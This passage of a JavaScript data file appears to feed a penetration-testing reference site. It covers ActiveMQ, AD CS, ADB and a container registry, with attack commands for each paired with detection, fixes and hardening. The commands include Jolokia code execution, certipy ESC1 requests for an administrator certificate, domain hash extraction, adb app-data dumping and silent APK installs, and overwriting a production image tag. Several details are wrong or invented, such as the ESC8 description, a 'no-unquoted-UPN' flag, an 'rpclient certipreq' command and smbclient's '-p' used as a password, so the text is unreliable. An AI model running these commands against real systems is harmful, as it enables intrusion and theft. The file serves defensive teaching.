export const services = [
  {
    slug: "activemq",
    name: "ActiveMQ",
    port: 61616,
    protocol: "tcp",
    risk: "critical",
    tags: ["messaging", "middleware", "java"],
    summary:
      "ActiveMQ is a Java message broker that sits between producers and consumers of queues and topics. The default OpenWire listener on 61616 carries no encryption and often no authentication, and the bundled web console on 8161 frequently exposes a Jolokia endpoint that hands out JMX access. An unauthenticated Jolokia connection is effectively remote code execution on the broker host. Compromised brokers are also a supply-chain problem, because messages carry the payloads that downstream services trust.",
    connect: [
      {
        label: "TCP check",
        command: "nc -nv <target> 61616",
        detail:
          "The port either accepts the connection and waits for a protocol frame or resets immediately. It never produces a readable banner, so plan on speaking OpenWire or pivoting to the HTTP console.",
      },
      {
        label: "Web console",
        command: "curl -s -o /dev/null -w '%{http_code}\\n' http://<target>:8161/",
        detail:
          "The console usually lives on 8161. A 200 response means the admin UI and the Jolokia API underneath it are reachable from where you sit.",
      },
      {
        label: "Jolokia API",
        command: "curl -s http://<target>:8161/api/jolokia/",
        detail:
          "A JSON list of every MBean the agent exposes. The response alone tells you whether the endpoint requires a token or not.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 61616,8161,5672 <target>",
        detail:
          "Scan the OpenWire port together with the console and the AMQP listener. ActiveMQ versions often ship several transports at once, and the newest one is the one you should target.",
      },
      {
        title: "Console fingerprint",
        command: "curl -sI http://<target>:8161/ | grep -i -E 'server|location'",
        detail:
          "The console banner usually gives the ActiveMQ version and the address it is bound to. The version decides which Jolokia and deserialisation issues apply.",
      },
      {
        title: "Jolokia reachability",
        command: "curl -s http://<target>:8161/api/jolokia/read/java.lang:type=Runtime | head -c 400",
        detail:
          "A successful read returns JVM attributes. An authentication error means the endpoint is protected; a full attribute dump means it is wide open.",
      },
    ],
    enumeration: [
      {
        title: "Queue and destination inventory",
        command: "curl -s 'http://<target>:8161/api/message?destination=TEST' | head -c 500",
        detail:
          "The message API browses queue contents. On a broker with no auth in front of it, this is a fast way to see what data actually flows through the estate.",
      },
      {
        title: "Broker configuration",
        command: "curl -s http://<target>:8161/api/jolokia/read/org.apache.activemq:type=Broker,brokerName=localhost | jq '.value'",
        detail:
          "The broker MBean exposes the configuration, including transport connectors and any credentials embedded in them. Check for a copy of the active configuration first.",
      },
      {
        title: "Broker version and build",
        command: "curl -s http://<target>:8161/api/jolokia/read/org.apache.activemq:type=Broker,brokerName=localhost/Version",
        detail:
          "Knowing the exact build lets you match it against published advisories instead of guessing which issues apply.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated Jolokia access",
        severity: "critical",
        command: "curl -s http://<target>:8161/api/jolokia/list | head -c 400",
        detail:
          "Jolokia is a REST bridge onto JMX. When it needs no token, any MBean operation is callable, which includes invoking methods on the broker and on the JVM.",
        detection:
          "Jolokia requests in the access log, especially list, read and exec calls from an address that never talks to the console normally. Broker log entries for unexpected MBean invocations.",
        fix:
          "Put the console behind authentication and a reverse proxy, restrict Jolokia to localhost, and disable the Jolokia agent entirely if the API is not used.",
      },
      {
        title: "Weak or default console credentials",
        severity: "high",
        command: "curl -s -u admin:admin http://<target>:8161/admin/",
        detail:
          "The shipped admin account starts with a known password and the console does not always enforce a change on first login. Credentials for it are frequently still in runbooks and deployment scripts.",
        detection:
          "Repeated 401 responses from one source address, followed by a 200 on the same source. The console audit log lists authentication attempts when logging is enabled.",
        fix:
          "Replace the default admin credentials, require a real identity provider for the console, and give operators named accounts with individual roles.",
      },
      {
        title: "Cleartext OpenWire transport",
        severity: "high",
        command: "nc -nv <target> 61616",
        detail:
          "OpenWire without TLS hands message content, credentials in message properties and the broker protocol to anyone on the path. Connected clients also trust whatever the broker says, so a hijacked connection can feed poisoned messages to consumers.",
        detection:
          "Connections to 61616 from unexpected subnets. Broker metrics showing clients from addresses outside the application tier.",
        fix:
          "Require TLS on the OpenWire and AMQP transports, validate client certificates where the architecture allows it, and keep the broker off shared networks.",
      },
    ],
    postEx: [
      {
        title: "Remote code execution through Jolokia exec",
        severity: "critical",
        command:
          "curl -s 'http://<target>:8161/api/jolokia/exec/java.lang:type=Runtime/exec/id' | jq .",
        detail:
          "The exec operation invokes a method on an MBean. Calling exec on the Runtime MBean runs a command as the broker service account, which in most deployments is a full account on the host.",
        detection:
          "Outbound process creation from the broker host immediately after a Jolokia exec call. Any child process of the Java broker that is not a known connector.",
        fix:
          "Remove the Jolokia agent or lock it behind authentication with a strict policy, and run the broker as an unprivileged user with no write access to sensitive paths.",
      },
      {
        title: "Message interception and tampering",
        severity: "high",
        command:
          "curl -s -X POST 'http://<target>:8161/api/message?destination=TEST' -H 'Content-Type: application/json' -d '{\"body\":\"{\\\"Text\\\":\\\"injected\\\"}\"}'",
        detail:
          "The message API can read and write queue content. Poisoning a queue lets an attacker corrupt downstream processing, which is how broker access turns into application-level compromise.",
        detection:
          "Message IDs or content hashes that do not match what the producer claims to have sent. Queue depth and consumption rate shifts that follow a deployment.",
        fix:
          "Restrict the REST message API with authorisation, and use schema validation and message signing for the payloads that cross trust boundaries.",
      },
      {
        title: "Credential theft from broker configuration",
        severity: "high",
        command:
          "curl -s http://<target>:8161/api/jolokia/read/org.apache.activemq:type=Broker,brokerName=localhost | jq '.value.TransportConnector'",
        detail:
          "Connector definitions, remote broker URLs and client certificates often live side by side in the configuration. A single read can hand over credentials for several other systems.",
        detection:
          "Jolokia reads of the broker MBean from hosts that are not consoles, especially repeat reads of configuration attributes.",
        fix:
          "Move credentials into a secret store, reference them from the configuration instead of embedding them, and rotate anything that has been embedded for a long time.",
      },
    ],
    commands: [
      { command: "nmap -sV -p 61616,8161 <target>", description: "Fingerprint the broker, the console and the transport versions." },
      { command: "curl -s http://<target>:8161/api/jolokia/list", description: "Lists every exposed MBean through the Jolokia REST bridge." },
      { command: "curl -s http://<target>:8161/api/jolokia/read/java.lang:type=Runtime", description: "Reads JVM runtime attributes without authentication on many brokers." },
      { command: "curl -s http://<target>:8161/api/jolokia/exec/<mbean>/<operation>", description: "Invokes an MBean operation. This is the execution primitive." },
      { command: "curl -s 'http://<target>:8161/api/message?destination=<queue>'", description: "Browses queue content through the REST message API." },
      { command: "curl -s http://<target>:8161/api/queues", description: "Lists queues and their statistics." },
      { command: "curl -s -u admin:admin http://<target>:8161/admin/", description: "Tests the shipped console credentials." },
      { command: "nc -nv <target> 61616", description: "Opens the OpenWire transport to confirm it is listening." },
      { command: "openssl s_client -connect <target>:61616 -quiet", description: "Handshake check when the transport is configured for TLS." },
      { command: "journalctl -u activemq -n 200 | grep -i error", description: "Reads broker logs on the host for configuration clues." },
    ],
    hardening: [
      {
        title: "Remove the Jolokia agent",
        detail:
          "The JMX-to-REST bridge is the shortest path from an HTTP request to code execution. If the API is not consumed by something you control, do not install it.",
      },
      {
        title: "Protect the console and API",
        detail:
          "Bind the console to a loopback or management interface, put it behind a reverse proxy that enforces authentication, and never expose 8161 to user networks.",
      },
      {
        title: "Require TLS and client authentication",
        detail:
          "Encrypt OpenWire and AMQP transports and validate client certificates where the architecture allows, so a rogue broker on the segment cannot feed the real one.",
      },
      {
        title: "Use named accounts with least privilege",
        detail:
          "Replace the shared admin account with individual credentials and separate roles for console operators, producers and consumers.",
      },
      {
        title: "Restrict the message API",
        detail:
          "Disable or authorise the REST message endpoints, and keep the management API off the same network as the application traffic.",
      },
      {
        title: "Harden the host and monitor",
        detail:
          "Run the broker as a dedicated unprivileged user, keep it patched, and alert on console logins, MBean invocations and configuration changes.",
      },
    ],
    tools: ["nmap", "curl", "netcat", "metasploit", "openssl"],
  },
  {
    slug: "ad-cs",
    name: "AD CS",
    port: 135,
    protocol: "tcp",
    risk: "critical",
    tags: ["active-directory", "pki", "windows", "certificate"],
    summary:
      "Active Directory Certificate Services issues the certificates that many Windows services use to authenticate. Its enrolment interface lives on RPC and on the web enrolment pages, and it talks to Active Directory to decide who may request what. A handful of template misconfigurations, known as ESC1 through ESC8, turn an ordinary low-privileged account into a Domain Admin certificate. The audit trail is good in theory and rarely enabled in practice.",
    connect: [
      {
        label: "RPC interface mapper",
        command: "nmap -sV -p 135,49152-65535 --script rpc-enum <target>",
        detail:
          "The enumeration lands on the RPC interface list. The certificate request interface UUID is the one that confirms a CA is hosted here.",
      },
      {
        label: "Web enrolment",
        command: "curl -sk https://<target>/certsrv/",
        detail:
          "The IIS front end for the CA. It names the CA and the policies it offers, and it is reachable even when the RPC interface is firewalled.",
      },
      {
        label: "Certificate request client",
        command: "certipy req -u '<user>@<domain>' -p '<password>' -ca '<ca-host>' -target <target> -template <template>",
        detail:
          "A real enrolment request. The CA hostname and a template name are the two things you need to start with.",
      },
    ],
    recon: [
      {
        title: "Locate the CA in Active Directory",
        command:
          "ldapsearch -x -H ldap://<dc> -D '<domain>\\<user>' -W -b 'CN=Public Services,CN=Services,CN=Configuration,<dc>' '(objectClass=pKICertificateAuthority)' cn",
        detail:
          "Every enrolled CA is published in the configuration partition. This tells you which hosts to test and how many certificates you are dealing with.",
      },
      {
        title: "Enumerate certificate templates",
        command:
          "ldapsearch -x -H ldap://<dc> -D '<domain>\\<user>' -W -b 'CN=Public Services,CN=Services,CN=Configuration,<dc>' '(objectClass=pKICertificateTemplate)' cn msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag msPKI-RA-Signature",
        detail:
          "The enrolment flags and RA signature properties decide whether a template is exploitable. They are all readable with an ordinary domain account.",
      },
      {
        title: "Confirm the RPC interface",
        command: "nmap -sV -p 135 --script rpc-enum <target>",
        detail:
          "The certificate request interface shows up as an MS-ICPR entry. Its absence means the CA is not exposed over RPC and the web enrolment path is the only route.",
      },
    ],
    enumeration: [
      {
        title: "Review template permissions",
        command:
          "ldapsearch -x -H ldap://<dc> -D '<domain>\\<user>' -W -b 'CN=Public Services,CN=Services,CN=Configuration,<dc>' '(objectClass=pKICertificateTemplate)' nTSecurityDescriptor",
        detail:
          "Who can enrol, who can write to the template, and who can publish it. Write access to a template is what turns ESC4 into a real path.",
      },
      {
        title: "List issued certificates",
        command:
          "certutil -view -restrict \"Disposition=20\" -out \"Request-Id\" \"Requester Name\" \"Common Name\" \"Template Name\" <target>",
        detail:
          "The CA's own logs list every issued certificate. The requester and template columns show whether unusual enrolments have already happened.",
      },
      {
        title: "Enrolment agent configuration",
        command:
          "ldapsearch -x -H ldap://<dc> -D '<domain>\\<user>' -W -b 'CN=Public Services,CN=Services,CN=Configuration,<dc>' '(objectClass=msPKI-EnrollmentAgent)' distinguishedName",
        detail:
          "Enrolment agents are accounts allowed to enrol on behalf of other users. They are often service accounts with more privilege than intended.",
      },
    ],
    attacks: [
      {
        title: "ESC1 - enrol a certificate for any name",
        severity: "critical",
        command:
          "certipy req -u '<user>@<domain>' -p '<password>' -ca '<ca-host>' -target <target> -template <template> -upn 'administrator@<domain>'",
        detail:
          "If a template lets the requester supply the subject name and includes client authentication, you can request a certificate for any account and authenticate with it over PKINIT. The path runs from a standard domain user to Domain Admin.",
        detection:
          "Event 4886 and 5136 on the CA for enrolments against templates outside the standard set, plus 4768 and 4769 on the domain controllers showing certificate logons from hosts that do not normally authenticate that way.",
        fix:
          "Remove the ENROLLEE_SUPPLIES_SUBJECT permission from templates, remove client authentication EKU where it is not needed, and restrict Enroll rights to a dedicated group per template.",
      },
      {
        title: "ESC8 - unquoted UPN in the subject alternative name",
        severity: "high",
        command:
          "certipy req -u '<user>@<domain>' -p '<password>' -ca '<ca-host>' -target <target> -template <template> -upn 'administrator@<domain>'",
        detail:
          "A template signed by an RA that does not require the subject to match the request can carry a UPN that no directory object owns. Relying parties that trust the CA accept it anyway, so the certificate becomes a valid identity.",
        detection:
          "Certificates issued with a UPN that does not resolve to a directory object. Correlate CA issuance events against 4768 and 4769 on the domain controllers.",
        fix:
          "Set the no-unquoted-UPN enrolment flag on every template that uses an RA signature, and retire templates that are no longer needed.",
      },
      {
        title: "Filesystem access to the CA host",
        severity: "high",
        command: "smbclient //<target>/C$ -U '<domain>\\<user>' -p '<password>'",
        detail:
          "A low-privileged domain account with SMB rights to the CA host can read the CA database and its private key material, or copy configuration files that contain the credentials the CA uses to issue.",
        detection:
          "Network logon type 3 events on CA hosts from accounts that are not in the CA administrators group, especially reads of Crypto or the CA configuration directories.",
        fix:
          "Keep CA administration rights separate from ordinary admin rights, remove C$ and Admin$ access for non-admin accounts, and monitor CA hosts as tier zero systems.",
      },
    ],
    postEx: [
      {
        title: "Authenticate with the forged certificate",
        severity: "critical",
        command: "certipy auth -pfx administrator.pfx -dc <dc>",
        detail:
          "PKINIT turns a certificate into a TGT, so a properly minted certificate logs you in as the account it names. From that point the rest of the domain is open.",
        detection:
          "Certificate logon events on domain controllers for accounts that never use smart cards, and logons at unusual hours from new workstations.",
        fix:
          "Treat certificate issuance as privilege assignment. Audit it, restrict it, and require strong mapping between the certificate subject and a directory object.",
      },
      {
        title: "Extract the domain secrets",
        severity: "critical",
        command: "python3 secretsdump.py -pfx administrator.pfx -dc-ip <ip> <domain>/administrator",
        detail:
          "With a privileged identity in hand, hash extraction from the domain controllers becomes the next step and frequently produces the credentials for the whole estate.",
        detection:
          "Mass replication requests from a single host, unusual volume of Kerberos ticket requests and replication errors on the domain controllers.",
        fix:
          "Enable privileged audit for replication, restrict replication rights, and protect the domain controllers as tier zero assets with just-in-time access.",
      },
      {
        title: "Harvest the CA private key and configuration",
        severity: "high",
        command:
          "smbclient //<target>/C$ -U '<domain>\\<user>' -p '<password>' -c 'cd \\Windows\\System32\\Crypto\\Keys; dir'",
        detail:
          "The signing key on a CA is the crown jewel of the whole PKI. With it, certificates can be forged for any template, and revocation stops meaning anything.",
        detection:
          "Reads of the Crypto\\Keys directory or of the CA database from any account outside the CA administrators group.",
        fix:
          "Restrict access to CA private keys to the CA service and CA administrators, and alert on any access from another host.",
      },
    ],
    commands: [
      { command: "certipy req -u '<user>@<domain>' -p '<password>' -ca '<ca-host>' -target <target> -template <template>", description: "Requests a certificate using a named template." },
      { command: "certipy req -u '<user>@<domain>' -p '<password>' -ca '<ca-host>' -target <target> -upn '<name>@<domain>'", description: "Requests a certificate with a chosen UPN in the SAN." },
      { command: "certipy auth -pfx <file>.pfx -dc <dc>", description: "Authenticates to the domain with a certificate over PKINIT." },
      { command: "certipy req -u '<user>@<domain>' -p '<password>' -ca '<ca-host>' -target <target> -enumerate", description: "Lists the templates the account may enrol against." },
      { command: "rpclient -U '<domain>\\<user>' -p '<password>' <target> -c 'certipreq <request>'", description: "Speaks the raw certificate request RPC interface." },
      { command: "ldapsearch -x -H ldap://<dc> -b 'CN=Public Services,CN=Services,CN=Configuration,<dc>' '(objectClass=pKICertificateAuthority)' cn", description: "Finds the CA objects published in Active Directory." },
      { command: "ldapsearch -x -H ldap://<dc> -b 'CN=Public Services,CN=Services,CN=Configuration,<dc>' '(objectClass=pKICertificateTemplate)' cn msPKI-Enrollment-Flag", description: "Lists templates with their enrolment flags." },
      { command: "certutil -view -restrict \"Disposition=20\" -out \"Request-Id\" \"Common Name\" <target>", description: "Shows the CA issuance history." },
      { command: "openssl x509 -in <cert>.pem -noout -text", description: "Inspects an issued certificate's extensions and SAN." },
      { command: "curl -sk https://<target>/certsrv/", description: "Queries the web enrolment interface for CA details." },
    ],
    hardening: [
      {
        title: "Audit template configuration, not just usage",
        detail:
          "Run a regular comparison of template flags, EKUs and permissions against a known-good baseline. ESC1 and ESC8 are configuration defects, and configuration drifts.",
      },
      {
        title: "Restrict enrolment rights",
        detail:
          "Move enrolment into groups per template, remove Domain Users from the default user and Domain Controller Authentication templates, and review every principal with the Enroll extended right.",
      },
      {
        title: "Remove write access to templates",
        detail:
          "ESC4 depends on the ability to modify a template object. Nobody outside the CA owners should hold write on template or configuration containers.",
      },
      {
        title: "Turn on the right audit events",
        detail:
          "Audit Certificate Template Enrollment, Certificate Authority Configuration Change and Certificate Template Change on the CA, and alert on 4886, 4899, 4903 and 4904.",
      },
      {
        title: "Tier the CA",
        detail:
          "Keep an offline root and a separate issuing CA for tier zero assets. An internet-facing or broadly reachable CA should never hold the keys that matter.",
      },
      {
        title: "Limit exposure of the RPC interface",
        detail:
          "Restrict 135 and the dynamic RPC ports to management and application hosts. Disabling the web enrolment role removes a large part of the attack surface when it is not needed.",
      },
    ],
    tools: ["nmap", "certipy", "ldapsearch", "impacket", "openssl", "curl"],
  },
  {
    slug: "adb",
    name: "ADB",
    port: 5555,
    protocol: "tcp",
    risk: "high",
    tags: ["android", "mobile", "debug"],
    summary:
      "The Android Debug Bridge is the tool developers use to install builds, read logs and open a shell on a device. Run over TCP it listens with no authentication at all, and the shell it hands out belongs to the adb user, which on most devices can reach application data through run-as. Wireless debugging on modern Android adds a pairing step, but the older tcpip mode on 5555 remains in plenty of labs and test fleets. Devices left in this state are effectively unmanaged computers.",
    connect: [
      {
        label: "ADB client",
        command: "adb connect <ip>:5555",
        detail:
          "The client performs the handshake and shows the device state. A device that appears as device rather than unauthorized is accepting the connection without any credential.",
      },
      {
        label: "Device list",
        command: "adb devices -l",
        detail:
          "Lists every device the client knows about, with model and transport. Useful to confirm which serial you are actually talking to before running anything destructive.",
      },
      {
        label: "Raw protocol check",
        command: "printf 'host::features=cmd,shell_v2\\n' | nc -nv <ip> 5555",
        detail:
          "The daemon answers with a CNXN frame carrying the device serial and product model. That reply is a reliable fingerprint even when the adb client is not installed.",
      },
    ],
    recon: [
      {
        title: "Port and version detection",
        command: "nmap -sV -p 5555 <target>",
        detail:
          "ADB rarely advertises a version, but the port shows up and the handshake confirms it. Pair it with the raw protocol check for certainty.",
      },
      {
        title: "Device fingerprint over the wire",
        command: "printf 'host::features=cmd,shell_v2\\n' | nc -nv <ip> 5555",
        detail:
          "The CNXN response includes properties such as the product model, the build fingerprint and the device serial number. That is free reconnaissance.",
      },
      {
        title: "Local ADB artefacts",
        command: "ls -la ~/.android/adbkey* && adb kill-server && adb start-server",
        detail:
          "Your own authorised keys are worth checking before a session. Rotating them is the quickest way to revoke any device that was paired earlier.",
      },
    ],
    enumeration: [
      {
        title: "Device properties",
        command: "adb -s <ip>:5555 shell getprop",
        detail:
          "The full property list. Look for ro.debuggable, ro.secure, ro.build.type and any build fingerprint that identifies a pre-production image.",
      },
      {
        title: "Installed packages",
        command: "adb -s <ip>:5555 shell pm list packages -3",
        detail:
          "Third-party packages only. The package names often reveal the organisation, the customer and any bespoke corporate applications.",
      },
      {
        title: "Shell identity",
        command: "adb -s <ip>:5555 shell id",
        detail:
          "Confirms the uid the shell runs as and the SELinux context. A root uid or an unconfined context changes what you can do next.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated ADB access",
        severity: "critical",
        command: "adb connect <ip>:5555 && adb -s <ip>:5555 shell id",
        detail:
          "There is no password in the legacy tcpip mode. Anything that can reach the port can run shell commands as the adb user, install packages and read the log buffer.",
        detection:
          "The device screen shows an authorisation prompt for a new computer, and the log buffer records the connection attempt. Host-side logs show adb connections to unusual addresses.",
        fix:
          "Disable USB debugging and wireless debugging on any device that leaves a developer, and turn off the developer options entirely on production hardware.",
      },
      {
        title: "Application data theft through run-as",
        severity: "high",
        command: "adb -s <ip>:5555 shell run-as <package> ls -la files",
        detail:
          "Debuggable applications expose their private directory to the adb shell through run-as. Session tokens, cached credentials and local databases live in that directory.",
        detection:
          "Application sandbox access from the shell uid, and debug builds appearing in production app stores or MDM inventories.",
        fix:
          "Ship release builds with android:debuggable set to false, and treat any debug build on a device as a full compromise of that application.",
      },
      {
        title: "Silent application installation",
        severity: "high",
        command: "adb -s <ip>:5555 install -r <payload>.apk",
        detail:
          "Installs run without any user prompt over ADB. A malicious package with elevated permissions can then capture everything the user does on the device.",
        detection:
          "Package installation events in the device log, and an installed application list that does not match the MDM inventory.",
        fix:
          "Enforce managed installs through MDM, deny install requests from unknown sources, and monitor for packages appearing on devices without a corresponding deployment record.",
      },
    ],
    postEx: [
      {
        title: "Dump the private data of every application",
        severity: "critical",
        command:
          "adb -s <ip>:5555 shell 'su -c \"tar czf /data/local/tmp/data.tgz /data/data\"' && adb -s <ip>:5555 pull /data/local/tmp/data.tgz",
        detail:
          "On a rooted device the whole data partition is available in one command. On a stock device you get the debuggable applications instead, which is often enough.",
        detection:
          "A tar or zip archive written into /data/local/tmp, and bulk reads of /data/data by the shell uid.",
        fix:
          "Keep devices encrypted at rest, require a screen lock, and rely on device attestation to detect rooted and tampered devices.",
      },
      {
        title: "Read messages and capture the screen",
        severity: "high",
        command: "adb -s <ip>:5555 exec-out screencap -p > screen.png",
        detail:
          "Screenshots, call logs and the SMS content provider are all reachable from the shell. On a test device holding real data, this is a complete read of the user's day.",
        detection:
          "Screen capture and content provider queries in the device log, and files written locally from an adb pull.",
        fix:
          "Do not place personal data on test devices, and wipe them between engagements with a documented procedure.",
      },
      {
        title: "Proxy the device traffic",
        severity: "high",
        command: "adb -s <ip>:5555 shell settings put global http_proxy <ip>:8080",
        detail:
          "Pointing the device at an intercepting proxy captures every cleartext request the device makes, and it survives until the setting is cleared. TLS pinning blocks the interesting parts, but plenty of apps still leak.",
        detection:
          "A changed global proxy setting on the device and an MDM policy that flags it as a configuration deviation.",
        fix:
          "Enforce a corporate proxy with certificate pinning, and treat a proxy setting on a managed device as an alert condition.",
      },
    ],
    commands: [
      { command: "adb devices -l", description: "Lists attached and connected devices." },
      { command: "adb connect <ip>:5555", description: "Opens an ADB connection over TCP." },
      { command: "adb -s <ip>:5555 shell id", description: "Runs a command and shows the resulting identity." },
      { command: "adb -s <ip>:5555 shell getprop", description: "Prints all system properties." },
      { command: "adb -s <ip>:5555 shell pm list packages -3", description: "Lists third-party installed packages." },
      { command: "adb -s <ip>:5555 shell dumpsys package <package>", description: "Shows package details, permissions and debug flags." },
      { command: "adb -s <ip>:5555 logcat -d", description: "Dumps the device log buffer." },
      { command: "adb -s <ip>:5555 shell 'settings get global adb_enabled'", description: "Reports the current ADB state." },
      { command: "adb -s <ip>:5555 install -r <file>.apk", description: "Installs or replaces a package." },
      { command: "adb -s <ip>:5555 reverse tcp:8080 tcp:8080", description: "Forwards a device port back to the host." },
    ],
    hardening: [
      {
        title: "Keep debugging off",
        detail:
          "Developer options stay off on production devices and wireless debugging is only enabled when a developer is actively working on the device.",
      },
      {
        title: "Require authorisation for every host",
        detail:
          "Use ro.adb.secure and the on-device authorisation prompt so a new computer is never trusted silently. Revoke stale authorisations from developer options.",
      },
      {
        title: "Never expose 5555",
        detail:
          "Do not leave adb tcpip mode running. If remote debugging is unavoidable, tunnel it over SSH and bind it to a loopback address on the device.",
      },
      {
        title: "Build release images properly",
        detail:
          "Set android:debuggable to false, remove debuggable variants from the distribution channel and scan the release build before it ships.",
      },
      {
        title: "Manage devices centrally",
        detail:
          "Enrol every device in an MDM, enforce encryption and screen locks, and use attestation to spot rooted or tampered hardware.",
      },
      {
        title: "Watch for the signs",
        detail:
          "Alert on adb connections from unexpected hosts, new authorisation prompts, and package installations with no matching deployment record.",
      },
    ],
    tools: ["adb", "nmap", "netcat", "metasploit"],
  },
  {
    slug: "artifact-registry",
    name: "Artifact Registry",
    port: 5000,
    protocol: "tcp",
    risk: "high",
    tags: ["container", "registry", "supply-chain", "devops"],
    summary:
      "A Docker Registry v2 API, or a product such as Harbor built on it, stores the images your pipeline produces. The API is deliberately simple and it is often left with anonymous pull enabled, which hands over the source and configuration of private applications. Images themselves are a well-known secret store, because build steps leave environment variables, cloud keys and private keys in layers. Write access to a registry is even better, because it lets you replace the artefact the next deploy will pick up.",
    connect: [
      {
        label: "Registry API version",
        command: "curl -s http://<target>:5000/v2/",
        detail:
          "The API root answers with a JSON version document on a healthy registry. A 401 here means authentication is on, and the WWW-Authenticate header names the realm to use.",
      },
      {
        label: "Repository listing",
        command: "curl -s http://<target>:5000/v2/_catalog",
        detail:
          "Lists every repository when the registry allows anonymous access. Even a locked registry often leaves the catalog endpoint readable.",
      },
      {
        label: "Docker client",
        command: "docker login <target>:5000",
        detail:
          "Interacts with the registry the same way the pipeline does. Useful for confirming which credentials work and whether the account can push.",
      },
    ],
    recon: [
      {
        title: "Service detection",
        command: "nmap -sV -p 5000 --script http-title,http-headers <target>",
        detail:
          "A registry announces itself in the response headers, and Harbor adds its own set. Fingerprinting the flavour tells you which API paths and dashboards exist.",
      },
      {
        title: "Authentication realm",
        command: "curl -sI http://<target>:5000/v2/ | grep -i -E 'www-authenticate|docker-'",
        detail:
          "The realm points at the token service, and the token service is what decides whether anonymous access is actually granted.",
      },
      {
        title: "Anonymous catalog access",
        command: "curl -s http://<target>:5000/v2/_catalog | jq .",
        detail:
          "An empty catalog and an anonymous token both need a closer look. A registry that returns repositories without a token is publishing its contents.",
      },
    ],
    enumeration: [
      {
        title: "Tags for a repository",
        command: "curl -s http://<target>:5000/v2/<repo>/tags/list | jq .",
        detail:
          "Tags often follow a naming convention that reveals the environment and the release train, for example staging, canary or release-2026-04.",
      },
      {
        title: "Image configuration",
        command: "crane config <target>:5000/<repo> | jq '.config.Env'",
        detail:
          "The image config holds the entrypoint, the environment and the build history. It is the first place to look for credentials and internal service addresses.",
      },
      {
        title: "Manifest and digest",
        command: "curl -s -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' http://<target>:5000/v2/<repo>/manifests/latest | jq .",
        detail:
          "The manifest lists every layer digest. Digest pinning is the only way to be sure the content matches what a tag claims.",
      },
    ],
    attacks: [
      {
        title: "Anonymous pull of a private image",
        severity: "high",
        command: "curl -s http://<target>:5000/v2/<repo>/manifests/latest | jq .config",
        detail:
          "When the token service grants pull without authentication, any application image can be pulled and unpacked. Application source, configuration and embedded keys all come with it.",
        detection:
          "Pull requests to private repositories from addresses outside the build and deploy pipeline, and token requests with no service account attached.",
        fix:
          "Turn off anonymous pull, require authentication for every repository, and scope tokens to specific projects and read-only roles.",
      },
      {
        title: "Secrets baked into image layers",
        severity: "high",
        command: "crane config <target>:5000/<repo> | jq -r '.config.Env[]' | grep -i -E 'pass|secret|key|token'",
        detail:
          "Build steps that take a secret as an argument or an environment variable leave it in the layer. Deleting the variable later does not remove it from the history.",
        detection:
          "Secret scanning of the registry, image signing policy checks, and alerts on new tags whose config contains credential-shaped strings.",
        fix:
          "Use build secrets that are mounted at build time, scan every image before it is pushed, and rotate anything that has already been published to a readable registry.",
      },
      {
        title: "Tag replacement in the pipeline path",
        severity: "critical",
        command: "docker tag <payload>:latest <target>:5000/<repo>:latest && docker push <target>:5000/<repo>:latest",
        detail:
          "If an account can push, it can replace the tag that the next deployment resolves. The malicious image then ships with a legitimate name and a valid signature from the CI identity.",
        detection:
          "Push events by identities outside the build pipeline, and manifest digest changes for a tag that is supposed to be immutable.",
        fix:
          "Make release tags immutable, require signed pushes with cosign or notation, verify signatures at deploy time, and separate read and write roles.",
      },
    ],
    postEx: [
      {
        title: "Overwrite a production tag",
        severity: "critical",
        command: "crane mutate <target>:5000/<repo> --tag latest --image <payload>@sha256:<digest>",
        detail:
          "Publishing a new manifest under an existing tag redirects every future pull. Registries with immutability enabled reject this, and that check is the point.",
        detection:
          "Digest changes on a deployed tag, and alerts on pushes to tags matching production naming patterns.",
        fix:
          "Enable tag immutability for release tags, restrict push to the CI identities, and pin deployments by digest.",
      },
      {
        title: "Extract pipeline credentials from an image",
        severity: "high",
        command: "crane export <target>:5000/<repo> - | tar tv | grep -i -E 'config.json|\\.env|credentials|\\.npmrc|\\.ssh'",
        detail:
          "Build images often carry the tooling configuration used during the build, including cloud credentials, package registry tokens and SSH keys.",
        detection:
          "Secret scanning results for stored images, and unusual numbers of layer pulls for build-only repositories.",
        fix:
          "Use short-lived workload identity tokens instead of static keys, and never copy credential files into the build context.",
      },
      {
        title: "Read a build image for the registry password",
        severity: "medium",
        command: "crane export <target>:5000/<repo> - | tar xO ./home/<user>/.docker/config.json",
        detail:
          "A docker config file inside a build image carries the base64 auth for the registry itself. Decoding it gives the push credential, which is usually more powerful than the pull credential.",
        detection:
          "Registry logs showing pulls of build images by accounts with no deployment purpose.",
        fix:
          "Use scoped robot accounts per pipeline, rotate them regularly, and keep build images in a separate project with restricted access.",
      },
    ],
    commands: [
      { command: "curl -s http://<target>:5000/v2/", description: "Checks the API version and authentication challenge." },
      { command: "curl -s http://<target>:5000/v2/_catalog", description: "Lists repositories without credentials." },
      { command: "curl -s http://<target>:5000/v2/<repo>/tags/list", description: "Lists the tags of one repository." },
      { command: "curl -s -H 'Authorization: Bearer <token>' http://<target>:5000/v2/<repo>/manifests/latest", description: "Fetches a manifest with a token." },
      { command: "docker pull <target>:5000/<repo>:latest", description: "Pulls an image exactly as the pipeline would." },
      { command: "docker login <target>:5000", description: "Tests credentials against the registry." },
      { command: "crane config <target>:5000/<repo>", description: "Prints the image configuration as JSON." },
      { command: "crane export <target>:5000/<repo> - | tar tv", description: "Lists the files inside an image layer." },
      { command: "skopeo inspect docker://<target>:5000/<repo>:latest", description: "Shows image metadata and the digest." },
      { command: "curl -s -X DELETE http://<target>:5000/v2/<repo>/manifests/<digest>", description: "Deletes a manifest. Only works with delete permission." },
    ],
    hardening: [
      {
        title: "Require authentication everywhere",
        detail:
          "Disable anonymous pull, including the catalog endpoint, and put the registry behind a token service that issues short-lived, scoped tokens.",
      },
      {
        title: "Separate read from write",
        detail:
          "Runtime services pull with read-only robot accounts. Only the build pipeline holds push rights, and only to its own project.",
      },
      {
        title: "Treat images as software supply chain",
        detail:
          "Sign images, verify signatures on deployment, scan for vulnerabilities and secrets before the push, and pin deployments by digest.",
      },
      {
        title: "Keep secrets out of layers",
        detail:
          "Use build secrets mounted at build time, pass tokens through the environment of the build step only, and rotate anything already published to a readable registry.",
      },
      {
        title: "Protect the transport",
        detail:
          "Terminate TLS at the registry or in front of it, and never expose 5000 to the internet without it.",
      },
      {
        title: "Audit and alert",
        detail:
          "Turn on registry audit logs for push, delete and login events, and alert on new repositories appearing in production projects.",
      },
